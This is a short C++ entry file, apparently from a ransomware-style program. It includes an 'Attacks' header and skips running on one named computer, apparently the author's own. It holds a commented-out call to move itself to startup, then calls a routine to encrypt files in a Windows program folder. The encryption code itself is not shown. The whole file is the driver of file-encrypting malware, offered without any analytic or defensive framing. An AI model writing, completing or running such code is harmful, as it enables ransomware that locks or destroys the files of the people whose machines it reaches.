#include <iostream>
#include <Windows.h>
#include "src/Util.h"
#include "src/Attacks.h"

int main() {
    std::string windowsName = Util::GetWindowsComputerName();
    if (windowsName == "DESKTOP-IHD1S0G") { return 1; }
    //Attacks::MoveToStart();
    Attacks::EncryptFiles("C:\\Program Files (x86)\\Internet Explorer");
    return 0;
}